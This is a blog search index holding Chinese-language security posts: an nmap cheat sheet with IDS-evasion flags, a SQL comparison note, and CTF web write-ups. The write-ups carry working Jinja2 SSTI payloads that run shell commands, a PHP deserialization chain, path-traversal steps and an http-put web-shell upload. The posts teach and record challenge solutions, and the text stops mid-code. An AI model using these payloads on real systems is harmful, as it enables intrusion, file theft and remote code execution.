<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透工具学习</title>
      <link href="/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本扫描</span></span><br><span class="line">nmap [IP] # 扫描一个主机</span><br><span class="line">nmap -Pn [IP] # 扫描一个主机如果无法ping通也继续扫描</span><br><span class="line">nmap [网络地址/子网前缀长度] # 扫描一个CIDR地址</span><br><span class="line">nmap [-iL] hosts.txt # 扫描文件内的所有主机</span><br><span class="line">nmap 192.168.1.1-10 # 扫描一个IP范围内的</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定端口</span></span><br><span class="line">nmap -p [端口号] [IP] # 扫描某个端口</span><br><span class="line">nmap -p [端口号-端口号] [IP] # 扫描某个区间端口</span><br><span class="line">nmap -p [端口号,..] [IP] # 扫描某个特定端口</span><br><span class="line">nmap -p- www.example.com # 扫描所有端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定扫描类型</span></span><br><span class="line">TCP SYN扫描（默认）：使用TCP SYN包探测主机上的开放端口。使用-sS选项指定。</span><br><span class="line">nmap -sS www.example.com</span><br><span class="line">TCP 连接扫描：使用TCP连接探测主机上的开放端口。使用-sT选项指定。</span><br><span class="line">nmap -sT www.example.com</span><br><span class="line">UDP 扫描：探测主机上的开放UDP端口。使用-sU选项指定。--top-ports &lt;number&gt; 最常用的UDP端口</span><br><span class="line">nmap -sU www.example.com </span><br><span class="line">nmap -sU --top-ports 20 &lt;target&gt; .将扫描前 20 个最常用的 UDP 端口，从而获得更可接受的扫描时间。</span><br><span class="line">操作系统检测：尝试识别主机的操作系统类型和版本。使用-O选项指定。</span><br><span class="line">nmap -O www.example.com</span><br><span class="line">版本检测：尝试识别主机上运行的服务及其版本。使用-sV选项指定。</span><br><span class="line">nmap -sV www.example.com</span><br><span class="line">全面扫描：结合TCP SYN扫描、TCP连接扫描、UDP扫描、操作系统检测和版本检测进行全面扫描。使用-sS -sT -sU -O -sV选项指定。</span><br><span class="line">nmap -sS -sT -sU -O -sV www.example.com</span><br><span class="line">TCP Null Scans TCP 空扫描 </span><br><span class="line">-sN</span><br><span class="line">TCP FIN Scans </span><br><span class="line">-sF</span><br><span class="line">TCP Xmas Scans </span><br><span class="line">-sX</span><br><span class="line">ping扫描</span><br><span class="line">-sn</span><br><span class="line">增加信息</span><br><span class="line">nmap -v www.example.com</span><br><span class="line">nmap -vv www.example.com # 二级</span><br><span class="line">aggressive 侵略模式</span><br><span class="line">nmap -A www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定扫描速度</span></span><br><span class="line">-T0：非常慢的速度</span><br><span class="line">-T1：慢速</span><br><span class="line">-T2：正常速度</span><br><span class="line">-T3：快速</span><br><span class="line">-T4：非常快的速度</span><br><span class="line">-T5：极快的速度</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出扫描结果</span></span><br><span class="line">-oA &lt;file&gt;: 三种格式文件</span><br><span class="line">-oN &lt;file&gt;：将扫描结果保存为普通文本文件</span><br><span class="line">-oX &lt;file&gt;：将扫描结果保存为XML文件</span><br><span class="line">-oG &lt;file&gt;：将扫描结果保存为可读性更好的格式</span><br><span class="line">nmap -oA example_scan www.example.com # 这将在当前目录中创建三个文件，文件名分别为：xample_scan.nmap：普通格式 example_scan.xml：XML格式 example_scan.gnmap：可grep格式</span><br><span class="line">nmap -oN result.txt www.example.com  # 将扫描结果保存为普通文本文件</span><br><span class="line">nmap -oX result.xml www.example.com  # 将扫描结果保存为XML文件</span><br><span class="line">nmap -oG result.txt www.example.com  # 将扫描结果保存为可读性更好的格式</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用脚本</span></span><br><span class="line">要从nmap脚本库中激活一个脚本，可以使用--script选项，后跟要激活的脚本名称。例如，以下命令将激活http-title脚本，该脚本可用于提取目标Web服务器的标题：</span><br><span class="line">nmap --script=http-title www.example.com</span><br><span class="line">您还可以使用逗号分隔的列表来激活多个脚本。例如，以下命令将激活http-title和http-headers脚本：</span><br><span class="line">nmap --script=http-title,http-headers www.example.com</span><br><span class="line">如果您想要激活所有脚本，可以使用 --script=all 选项。这将激活nmap脚本库中的所有脚本，但可能会导致扫描时间变长。</span><br><span class="line">nmap --script=all www.example.com</span><br><span class="line">以下命令将激活所有&quot;vuln&quot;类别中的脚本，并对www.example.com进行扫描：</span><br><span class="line">nmap --script=vuln www.example.com</span><br><span class="line">脚本库</span><br><span class="line">safe ：- 不会影响目标</span><br><span class="line">intrusive ：- 不安全：可能会影响目标</span><br><span class="line">vuln ：- 扫描漏洞</span><br><span class="line">exploit ：- 尝试利用漏洞</span><br><span class="line">auth ：- 尝试绕过正在运行服务的身份验证（例如匿名登录FTP服务器）</span><br><span class="line">brute ：- 尝试暴力破解正在运行服务的凭据</span><br><span class="line">discovery ：- 尝试查询正在运行的服务以获取有关网络的更多信息（例如查询 SNMP 服务器）。</span><br><span class="line">https://nmap.org/book/nse-usage.html</span><br><span class="line">某些脚本需要参数（例如，凭据，如果它们正在利用经过身份验证的漏洞）。这些可以通过 --script-args Nmap开关提供。这方面的一个例子是 http-put 脚本（用于使用 PUT 方法上传文件）。这需要两个参数：要将文件上传到的 URL 和文件在磁盘上的位置。例如：</span><br><span class="line">nmap -p 80 --script http-put --script-args http-put.url=&#x27;/dav/shell.php&#x27;,http-put.file=&#x27;./shell.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="搜索NSE脚本"><a href="#搜索NSE脚本" class="headerlink" title="搜索NSE脚本"></a>搜索NSE脚本</h3><p><code>grep &quot;&#123;脚本名字&#125;&quot; /usr/share/nmap/scripts/script.db</code></p><h3 id="防火墙规避"><a href="#防火墙规避" class="headerlink" title="防火墙规避"></a>防火墙规避</h3><p><code>-f</code> ：- 用于对数据包进行分段（即将它们分成更小的部分），使防火墙或 IDS 不太可能检测到数据包。</p><p><code>-f</code> 替代方法，但可以更好地控制数据包的大小： <code>--mtu &lt;number&gt;</code> ，接受用于发送的数据包的最大传输单元大小。这必须是 8 的倍数。</p><p><code>--scan-delay &lt;time&gt;ms</code> ：- 用于在发送的数据包之间添加延迟。如果网络不稳定，这非常有用，但对于规避可能存在的任何基于时间的防火墙/ IDS触发器也非常有用。</p><p><code>--badsum</code> ：- 这用于生成无效的数据包校验和。任何真正的TCP / IP堆栈都会丢弃此数据包，但是，防火墙可能会自动响应，而无需费心检查数据包的校验和。因此，此开关可用于确定是否存在防火墙/IDS。</p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于sql的一些理解</title>
      <link href="/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
      <url>/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入那些事"><a href="#sql注入那些事" class="headerlink" title="sql注入那些事"></a>sql注入那些事</h2><p>关于为什么 select * from user where ‘a1’ = ‘e1’ = ‘1’; 和 select * from user where ‘1’=’a1’ = ‘e1’;查询出来sql的值不一样</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230425230152933.png" alt="image-20230425230152933"></p><blockquote><p>首先这里说一点，sql字符串具有跟php字符串类似的性质，比如说，如果是以非数字开头的</p><p>例如: <code>&#39;qdadada&#39; &#39;adad&#39;</code> 这些字符串的逻辑值为<code>0</code></p><p>如果是以数字开头的</p><p>例如: <code>&#39;1aaaa&#39; &#39;2bbb&#39;</code> 这些字符串的逻辑值为<code>1</code></p></blockquote><h3 id="39-a1-39-39-e1-39-39-1-39-和-39-1-39-39-a1-39-39-e1-39-的区别"><a href="#39-a1-39-39-e1-39-39-1-39-和-39-1-39-39-a1-39-39-e1-39-的区别" class="headerlink" title="&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39; 和 &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;的区别"></a><code>&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39;</code> 和<code> &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code>的区别</h3><ul><li>执行顺序不同，造成执行结果截然不同。</li></ul><h4 id="39-a1-39-39-e1-39-39-1-39"><a href="#39-a1-39-39-e1-39-39-1-39" class="headerlink" title="&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;"></a><code>&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;</code></h4><ol><li>首先 <code>&#39;a1&#39; = &#39;e1&#39;</code>因为是字符串比较，所以返回false</li><li>表达式就变成了 <code>false = &#39;1&#39;</code> </li><li><code>&#39;1&#39;</code>的逻辑值为 1</li></ol><p>所以<code>false = &#39;1&#39;</code>返回了false</p><h4 id="39-1-39-39-a1-39-39-e1-39"><a href="#39-1-39-39-a1-39-39-e1-39" class="headerlink" title="&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;"></a><code>&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code></h4><ol><li>首先 <code>&#39;1&#39; = &#39;e1&#39;</code>是字符串比较 返回 fasle</li><li>所以表达式变成了 <code>false = &#39;e1&#39;</code></li><li><code>&#39;e1&#39;</code>的逻辑值为0</li></ol><p>所以最终为 false = ‘e1’ 返回了true</p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯-web-wp</title>
      <link href="/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/"/>
      <url>/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>没docker环境，赛后不好写wp，比赛时候忘记写wp了</p></blockquote><p>[TOC]</p><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>把变量字符串改短，然后搭到本地环境就好了，然后点击下</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204105304.png" alt="image-20230420204105304"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204217900.png" alt="image-20230420204217900"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a>Dreamer</h2><p>首先下载给的源码，源码里面有后台管理员的登录账号和密码。</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204407015.png" alt="image-20230420204407015"></p><p>然后到项目源码里面找到主题源码位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src\main\resources\db\dreamer-cms\templates</span><br></pre></td></tr></table></figure><p>随便一个主题找到<code>theme.json</code>把<code>themepath</code>对应的值改成<code>../../../../../../../../../../../../../../</code></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204642439.png" alt="image-20230420204642439"></p><p>然后上传主题包到后台管理的<code>风格管理</code>页面，</p><p><img src="https://foruda.gitee.com/images/1678954524753194744/7480eb3d_8686450.png" alt="输入图片说明"></p><p>然后在<code>模板管理</code>里面就可以遍历任意文件拿到flag了。不够我没有getshell，可能是环境没有定时任务</p><p><a href="https://gitee.com/isoftforce/dreamer_cms/issues/I6NP86">🛡️ 后台模板管理可以任意编辑导致GetShell · Issue #I6NP86 · 王俊南/Dreamer CMS（梦想家CMS内容管理系统） - Gitee.com</a></p><h2 id="Dreamer-revenge"><a href="#Dreamer-revenge" class="headerlink" title="Dreamer_revenge"></a>Dreamer_revenge</h2><p>同上，只有最后一步不一样。</p><p>读取/proc/1/environ的内容可以拿到flag，</p><p><a href="https://blog.csdn.net/m0_47696151/article/details/121947320"> 解析 linux 进程 pid 0, pid 1, pid 2 关系及启动过程_pid为0的进程_lylhw13_的博客-CSDN博客</a></p><p>首先推测flag在环境变量里面，因为这个题目根目录没flag，然后推测是docker环境在创建的时候同时设置到flag，所以在pid1里面寻找flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF—web-wp</title>
      <link href="/2023/04/20/GDOUCTF%E2%80%94web-wp/"/>
      <url>/2023/04/20/GDOUCTF%E2%80%94web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><blockquote><p>SSTI被过滤<code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `  `&#125;&#125;</code> 绕过方法。</p></blockquote><p>FUZZ跑一下测出来过滤了下列字符</p><p><code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `   `&#125;&#125;</code></p><p>这个题目如果没有过滤<code>\</code>就可以用unicode编码之类的绕过，但是过滤了<code>\</code>所以不能用unicode，</p><p>payload1:</p><p>采用 jinja2的过滤器attr和format</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c&#x27;|format(95,95,109,114,111,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(1)|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(132)|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;cat /f*&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure><p>payload2:</p><p>采用jinja2的过滤器attr和利用 flask的request方法来进行获取<code>__</code> (下面的payload要用burpsuite，不然被url编码以后就会失效)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /get_flag?__</span><br><span class="line">&#123;% for c in request|attr(&#x27;args&#x27;) %&#125;&#123;%print(&#x27;&#x27;|attr(c%2b&#x27;cla&#x27;&#x27;ss&#x27;%2bc)|attr(c%2b&#x27;ba&#x27;&#x27;se&#x27;%2bc)|attr(c%2b&#x27;subcl&#x27;&#x27;asses&#x27;%2bc)()|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(132)|attr(c%2b&#x27;in&#x27;&#x27;it&#x27;%2bc)|attr(c%2b&#x27;glob&#x27;&#x27;als&#x27;%2bc)|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;cat /flag&#x27;)|attr(&#x27;read&#x27;)()) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW愚人杯-web</title>
      <link href="/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/"/>
      <url>/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>这个题目很明显存在任意文件读取</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231659276.png" alt="image-20230408231659276"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231735400.png" alt="image-20230408231735400"></p><p>简单的base64</p><p>传一个img=aW5kZXgucGhw就得到flag了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;29728952-b4b7-44c3-a4a1-46bfd8789da8&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h3><p>这个题目首先要拿到 check.php 里面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa = &amp;<span class="variable">$a</span>-&gt;key;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;s:0:&quot;&quot;;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:53:&quot;php://filter/convert.base64-encode/resource=check.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233216873.png" alt="image-20230408233216873"></p><p>check.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一个很简单的移位，函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span 